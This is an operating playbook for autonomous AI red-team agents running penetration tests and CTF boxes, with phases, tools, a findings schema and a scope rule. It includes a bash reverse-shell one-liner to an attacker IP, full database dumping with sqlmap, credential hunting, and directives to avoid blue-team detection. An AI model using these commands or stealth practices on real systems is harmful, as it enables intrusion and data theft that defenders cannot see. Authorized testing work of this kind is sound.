# Red Team Engagement Playbook

Unified operating procedure for opencode red-team engagements: live targets, servers, and CTF boxes.

READ THIS FIRST. Every red-* agent follows this playbook AND the OPSEC doctrine in `~/.config/opencode/redteam/OPSEC.md`. OPSEC is non-negotiable: minimal backend noise, no blue-team triggers.

## Authorization & scope (mandatory)

Only test targets you are authorized to test (engagement scope, your own assets, CTF/lab boxes). Record scope and stop immediately if a target escapes it. Never harm third parties, never touch production data you are not authorized to access, and preserve evidence.

## Run workspace

Every engagement gets its own workspace:

```
~/redteam-runs/<target>/YYYY-MM-DD_HHMM/
  recon/          recon + survey output (JSON + raw tool logs)
  exploit/        payloads, PoCs, exploitation artifacts
  loot/           extracted data, dumps, creds (kept local)
  report/         findings.json, report.md, evidence
```

Create the dir tree at start of every engagement. Write every meaningful finding into these files as you go — agents checkpoint there so the next phase agent can continue.

## Kill chain & phases

1. **recon** (`red-recon`)  — passive + active footprint: WHOIS, DNS, subdomains, cert transparency, tech/WAF fingerprint, out-of-scope map. Output: `recon/recon.json`.
2. **survey** (`red-survey`) — attack surface: port/service scan (nmap), HTTP probing, directory/endpoint discovery, login discovery, API enumeration. Output: `recon/services.json`, endpoint lists.
3. **exploit-web** (`red-exploit-web`) — web-app vulns: SQLi, XSS, SSRF, RCE, auth bypass, IDOR/BOLA, file upload, SSTI, XXE, cache poisoning. Output: `exploit/findings-raw.md`.
4. **exploit-infra** (`red-exploit-infra`) — network/service/C2/AD: metasploit, brute force, tunneling, C2 (ankou), AD (cochise), SSH ops (aracne). Output: `exploit/findings-raw.md`.
5. **exfil** (`red-exfil`) — objective completion: SQL DB dump, PII/extraction, credential recovery, staging & transfer.
6. **validate** (`red-validate`) — adversarial re-check of every finding; kill false positives; confirm impact with a standalone reproduction.
7. **report** (`red-report`) — `report/findings.json` (schema below) + `report/report.md` with reproduction steps, evidence, CVSS 3.1, remediation.

Agents are allowed to skip to any phase if recon/survey already exists (read the checkpoint files instead of rescanning — saves time).

## Pipeline contract (noise reduction — READ)

Each phase consumes the previous phase's checkpoint files. **Every scan runs exactly once per engagement.**

| File | Written by | Read by |
|---|---|---|
| `recon/recon.json` | red-recon | everyone |
| `recon/services.json` | red-survey | exploit-* |
| `survey/hosts.json` | red-survey | exploit-* |
| `survey/endpoints.json` | red-survey | exploit-web |
| `survey/nuclei.txt` | red-survey | exploit-* (hits only) |
| `exploit/findings-raw.md` | exploit-* / privesc / exfil | exfil, conductor |

- If a checkpoint exists, **read it. Never re-run the scan** — duplicate scans are the #1 source of backend noise.
- red-recon owns OSINT/DNS/exposure discovery. red-survey owns the network scan (nmap/nuclei/dirbusting). exploit-* owns exploitation. privesc owns escalation.
- Attack-class playbooks are single-owned per `VULN_INDEX.md`. If you want a class not owned by your phase, hand it to the owning agent — do not read its playbook.
- One nuclei run (survey) for the whole engagement. One nmap full-port sweep per host. One gobuster/ffuf pass per host.

## Evidence standard (every finding MUST have)

- Exact request (method, full URL, headers, body) and exact response (status, relevant body bytes). Log with timestamps.
- Proof the impact: e.g. for SQLi — a row of real data (not just boolean difference); for RCE — command output; for XSS — the executed payload in a real context.
- **NOT valid proof**: a different HTTP status code alone, or a generic scanner hit with no readable impact.
- If you cannot prove impact independently, mark severity Low and flag as "unproven".

## Tool inventory (pre-resolved paths)

Interactive/system tools (launch via `bash`):
| Tool | Path / repo | Purpose |
|---|---|---|
| nuclei | /usr/bin/nuclei | fast vuln/template scanning |
| nmap | /usr/bin/nmap | port/service scan |
| ffuf | /usr/bin/ffuf | directory & parameter fuzzing |
| gobuster | /usr/bin/gobuster | directory/DNS fuzzing |
| sqlmap | /usr/bin/sqlmap | SQL injection automation |
| subfinder | /usr/bin/subfinder | subdomains |
| amass | /usr/bin/amass | subdomain/attack surface |
| nikto | /usr/bin/nikto | web server scan |
| msfconsole | /usr/bin/msfconsole | Metasploit framework |
| sqlite3 | /usr/bin/sqlite3 | query dumped databases |
| openosint-mcp | <path-to-openosint-mcp> | OSINT MCP (already wired) |

Agent repos (cloned locally, run from their own dir):
| Tool | Path | Purpose |
|---|---|---|
| Ankou (C2) | red-hex-consulting-ankou | operator-focused C2 + AI agent panel |
| Cochise (AD) | andreashappe-cochise | assumed-breach AD pentest agent |
| Grimoire | joranhonig-grimoire | autonomous security agent (venv active) |
| Aracne | stratosphereips-aracne | offensive/defensive SSH agent |
| BreachWeave | m-sec-org-breachweave | manager/observer/solver pentest agent |
| PentesterFlow | pentesterflow-agent | in-terminal agentic pentest + Burp |
| BoxPwnr | 0ca-boxpwnr | LLM/pentest benchmarking on HTB/THM etc. |
| claude-red | snailsploit-claude-red/Skills | offensive methodology skills (58) |
| neuro-sploit | ~/.neurosploit-app/agents_md/vulns | 196 vuln-specialist playbooks |

Use the claude-red Skills and neuro-sploit playbook files as **on-demand methodology references** — read the specific file for the vuln class you are attacking; do not bulk-load them.

## Playbook libraries (read on demand)

- NeuroSploit vuln specialist: `~/.neurosploit-app/agents_md/vulns/<name>.md` (names like `sqli_union.md`, `ssrf.md`, `auth_bypass.md`, `command_injection.md`, `file_upload.md`)
- NeuroSploit meta-agents (orchestrate/validate/report): `~/.neurosploit-app/agents_md/meta/<name>.md`
- claude-red categories: `snailsploit-claude-red/Skills/<category>/` where category in `web, auth, cloud, exploit-dev, fuzzing, infrastructure, recon, wireless, active-directory, ai, iot, mobile, utility`

## Output schema (findings.json)

```json
{
  "engagement": "<target>",
  "phase": "validate",
  "findings": [
    {
      "id": "F-001",
      "title": "SQL injection in /api/search?id=",
      "severity": "Critical",
      "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
      "cwe": "CWE-89",
      "location": "https://target/path",
      "evidence": ["exact request+response or command output"],
      "impact": "Full DB read (user table, N rows extracted)",
      "repro": "step-by-step reproduction",
      "remediation": "parameterized queries",
      "status": "confirmed|unproven"
    }
  ]
}
```

## Operating rules

- Prefer the fastest path to a proved objective; parallelize recon/survey with background jobs where safe.
- Keep payloads in the engagement workspace; never write payloads into system paths.
- Prefer non-destructive tests; for potential data-loss tests (DELETE/UPDATE/DROP), confirm scope explicitly first.
- If a tool is slow (nmap full, sqlmap heavy), run in background with `&`, log to a file, and poll.
- Checkpoint state after each phase (files above). If you are restarted, re-read checkpoints instead of re-scanning.

## CTF mode (HTB / THM / vulnhub / practice boxes)

When the "target" is a CTF/lab box, play to win. The objective ladder is: **foot shell → escalate -> root/additional flags + any DB dump**. Never stop early.

### Flag inventory (check every one of these on EVERY compromised box)
- `/root/root.txt`, `/root/flag.txt`, `/home/<user>/user.txt`, `/home/<user>/flag.txt`
- `/flag.txt`, `/flag`, `/.flag`, `/var/www/*/...`, `/opt/*`
- Flags hidden in DB tables, env vars, `.bash_history`, mail spools, attached SSH keys.
- THM format `THM{}`; HTB format `HTB{}` (strings of that shape anywhere).

### Foothold first, esthetics second
- Lab boxes are intentionally vulnerable: don't over-scan. The entry is usually in the top 1-3 services.
- Web foothold tactics: source maps / backups (`*.bak`, `*.old`, `.git`, `~` files), default creds, admin panels, SQLi on login (bypass), LFI→`/proc/self/environ` or `/etc/passwd`→SSH, file upload→webshell→RCE, SSTI, deserialization (PHP/Java/Python), command injection walls.
- On shell: immediately test `sudo -l`, SUID/`capabilities`, world-writable cron, docker group, `GTFOBins` (gftobins.json on disk or known pages), old kernel CVEs. Escalate to root — that is the win condition.
- Reverse shell protocol (rubber-stamp): attacker on this machine — find a listener IP (your outbound IP or a VPS you control), `nc -lvnp` in a background job, send payload on the box (`bash -c 'bash -i >& /dev/tcp/IP/443 0>&1'`, python/php one-liners, msfvenom for Linux/Windows).

### DB dump in CTFs
- `sqlmap --dump-all --batch` for the interesting tables; sample not required, copyright-style full dump of the obvious tables (users, flag tables) is expected.
- MySQL/Postgres with default creds (`root:`/`postgres:postgres`), config files with creds (`wp-config.php`, `.env`).

### Speed rules
- HTB/THM boxes: `nmap -p- --min-rate 4000` on EVERY IP once (background), never fewer than that for the full sweep.
- Run nuclei (`-severity medium,high,critical`) and gobuster/ffuf in parallel with service enumeration.
- The flagship benchmarker: run `0ca-boxpwnr` (BoxPwnr) against the box to compare tactics if you get stuck; read its README + `boxpwnr.py` for usage.

### Timeboxing
- If a vector hasn't produced in ~15-20 minutes, switch. Report back with what's tried and the next candidate. Optimization matters — the stronger the model, the fewer cycles.